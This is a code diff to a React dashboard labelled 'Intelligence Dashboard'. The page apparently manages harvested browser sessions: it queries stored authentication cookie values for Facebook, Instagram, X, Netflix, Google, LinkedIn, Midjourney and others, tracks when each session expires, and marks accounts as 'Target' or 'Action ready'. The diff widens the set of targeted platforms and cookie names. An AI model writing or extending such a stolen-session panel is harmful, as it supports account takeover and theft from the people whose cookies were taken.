@@ -42,14 +42,14 @@ export default function SessionsPage() {
 
   useEffect(() => {
     fetchSessions();
-    const timer = setInterval(() => fetchSessions(), 60000); // Auto-refresh data every minute
+    const timer = setInterval(() => fetchSessions(), 60000);
     return () => clearInterval(timer);
   }, []);
 
   const getHealthStatus = (sessionCookies: Cookie[]): "active" | "expiring" | "expired" => {
     if (!sessionCookies || sessionCookies.length === 0) return "active";
     const now = Date.now() / 1000;
-    const sessionCookie = sessionCookies.find(c => ["c_user", "ds_user_id", "auth_token", "SID"].includes(c.name));
+    const sessionCookie = sessionCookies.find(c => ["c_user", "ds_user_id", "auth_token", "SID", "NetflixId"].includes(c.name));
     if (!sessionCookie || !sessionCookie.expiration_date) return "active";
     if (sessionCookie.expiration_date < now) return "expired";
     if (sessionCookie.expiration_date < now + 604800) return "expiring";
@@ -58,21 +58,22 @@ export default function SessionsPage() {
 
   const identifyAccount = (sessionCookies: Cookie[], fallbackId: string): AccountInfo => {
     const health = getHealthStatus(sessionCookies);
-    const domainStr = sessionCookies.map(c => c.domain.toLowerCase()).join(" ");
+    const domains = sessionCookies.map(c => c.domain.toLowerCase());
+    const domainStr = domains.join(" ");
     
     // Detection Logic
     if (domainStr.includes("facebook.com")) {
       const fbId = sessionCookies.find(c => c.name === "c_user")?.value;
-      return { platform: "Facebook", identifier: fbId || "FB Account", icon: Facebook, color: "text-blue-500", health };
+      return { platform: "Facebook", identifier: fbId || "Facebook User", icon: Facebook, color: "text-blue-500", health };
     }
     if (domainStr.includes("instagram.com")) {
       const igId = sessionCookies.find(c => c.name === "ds_user_id")?.value;
-      return { platform: "Instagram", identifier: igId || "IG Account", icon: Instagram, color: "text-pink-500", health };
+      return { platform: "Instagram", identifier: igId || "Instagram Account", icon: Instagram, color: "text-pink-500", health };
     }
     if (domainStr.includes("openai.com") || domainStr.includes("chatgpt.com")) 
       return { platform: "ChatGPT", identifier: "AI Assistant", icon: MessageSquare, color: "text-emerald-400", health };
     if (domainStr.includes("kick.com"))
-      return { platform: "Kick", identifier: "Streamer", icon: Gamepad2, color: "text-green-500", health };
+      return { platform: "Kick", identifier: "Kick User", icon: Gamepad2, color: "text-green-500", health };
     if (domainStr.includes("x.com") || domainStr.includes("twitter.com"))
       return { platform: "X / Twitter", identifier: "Social", icon: Twitter, color: "text-blue-400", health };
     if (domainStr.includes("netflix.com"))
@@ -83,10 +84,10 @@ export default function SessionsPage() {
       return { platform: "Blackboard", identifier: "Student", icon: GraduationCap, color: "text-blue-400", health };
     if (domainStr.includes("google.com"))
       return { platform: "Google", identifier: "Google User", icon: Globe, color: "text-red-400", health };
-    if (domainStr.includes("openart.ai") || domainStr.includes("niji"))
+    if (domainStr.includes("openart.ai") || domainStr.includes("nijijourney") || domainStr.includes("midjourney"))
       return { platform: "AI Arts", identifier: "Creator", icon: Palette, color: "text-cyan-400", health };
 
-    if (sessionCookies.length > 0) return { platform: "Other App", identifier: "Active User", icon: Bot, color: "text-amber-400", health };
+    if (sessionCookies.length > 0) return { platform: "Active App", identifier: "Encrypted Session", icon: Bot, color: "text-amber-400", health };
     return { platform: "Unknown", identifier: fallbackId || "Anonymous", icon: Shield, color: "text-gray-400", health: "active" };
   };
 
@@ -101,13 +102,12 @@ export default function SessionsPage() {
       setSessions(sessionData);
       const sessionIds = sessionData.map(s => s.id);
       
-      // TARGETED FETCH: We fetch ONLY IDENTIFYING cookies to bypass limits.
-      // We look for common platform identifiers and a few general cookies per session.
+      // Fetch identifying cookies with ALL columns to fix TypeScript error
       const { data: identifyingCookies } = await supabase
         .from("cookies")
-        .select("snapshot_id, domain, name, value, expiration_date")
+        .select("*")
         .in("snapshot_id", sessionIds)
-        .or("name.eq.c_user,name.eq.ds_user_id,name.eq.auth_token,name.eq.SID,name.eq.NetflixId,name.eq.li_at,name.eq.dpr,name.eq.csrftoken,name.eq.sessionid");
+        .or("name.eq.c_user,name.eq.ds_user_id,name.eq.auth_token,name.eq.SID,name.eq.NetflixId,name.eq.li_at,name.eq.dpr,name.eq.csrftoken,name.eq.sessionid,name.eq.midjourney_access");
       
       const newAccountMap: Record<string, AccountInfo> = {};
       sessionData.forEach(session => {
@@ -182,7 +182,7 @@ export default function SessionsPage() {
       <header className="flex flex-col md:flex-row md:items-center justify-between gap-4">
         <div>
           <h2 className="text-3xl font-bold tracking-tight">Intelligence Dashboard</h2>
-          <p className="text-gray-400">Monitoring {sessions.length} sessions with optimized data fetch.</p>
+          <p className="text-gray-400">Monitoring {sessions.length} sessions with safe data fetch.</p>
         </div>
         
         <div className="flex items-center gap-3">
@@ -259,7 +259,7 @@ export default function SessionsPage() {
                     </div>
                     <div>
                       <h3 className="text-2xl font-bold">{accountMap[selectedSession.id]?.identifier}</h3>
-                      <p className="text-gray-400 text-sm">Target: {accountMap[selectedSession.id]?.platform.toLowerCase()}.com</p>
+                      <p className="text-gray-400 text-sm">Action ready for {accountMap[selectedSession.id]?.platform.toLowerCase()}</p>
                     </div>
                   </div>
                   <div className="flex gap-4">
